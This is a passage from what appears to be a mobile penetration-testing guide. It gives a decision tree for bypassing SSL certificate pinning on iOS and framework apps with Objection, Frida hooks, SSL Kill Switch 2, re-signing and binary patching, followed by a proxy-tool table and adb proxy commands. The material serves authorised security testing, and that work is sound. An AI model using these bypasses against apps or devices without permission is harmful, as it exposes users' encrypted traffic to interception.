│       │   ├── Yes → Objection ios sslpinning disable (§3.2) [FIRST TRY]
│       │   │   ├── Works? → done
│       │   │   └── Fails? → Frida SecTrust hooks (§3.1)
│       │   ├── Still fails? → SSL Kill Switch 2 (§3.3)
│       │   └── Still fails? → library-specific hooks (§3.4)
│       └── No jailbreak?
│           ├── Re-sign with Frida gadget → run Frida hooks
│           └── Binary patch → sideload (§3.5)
│
├── Framework-specific app?
│   ├── Flutter → reflutter tool or BoringSSL native hooks (§4.1)
│   ├── React Native → standard platform hooks (§4.2)
│   └── Xamarin → Objection or Mono runtime hooks (§4.3)
│
├── Bypass works but issues remain?
│   ├── Client cert required? → extract + import to proxy (§6.1)
│   ├── Non-HTTP protocol? → protocol-specific tooling (§6.1)
│   └── App crashes? → fix anti-tampering first (§6.1)
│
└── All methods fail?
    ├── Analyze traffic at network level (Wireshark/tcpdump)
    ├── Check for custom proprietary protocol
    └── Consider iptables + transparent proxy approach
```

---

## 8. PROXY SETUP QUICK REFERENCE

| Proxy Tool | Best For | SSL Bypass Integration |
|---|---|---|
| Burp Suite | Full HTTP analysis | Import CA to device |
| mitmproxy | Scripted interception | `mitmproxy --set confdir=~/.mitmproxy` |
| Charles Proxy | macOS-native, easy setup | Built-in CA installation |
| Proxyman | macOS/iOS native | Direct iOS device support |
| HTTP Toolkit | Quick Android setup | Automated CA + Frida bypass |

```bash
# Android proxy setup
adb shell settings put global http_proxy <host_ip>:8080

# Remove proxy
adb shell settings put global http_proxy :0

# iOS proxy: Settings → Wi-Fi → Configure Proxy → Manual
```
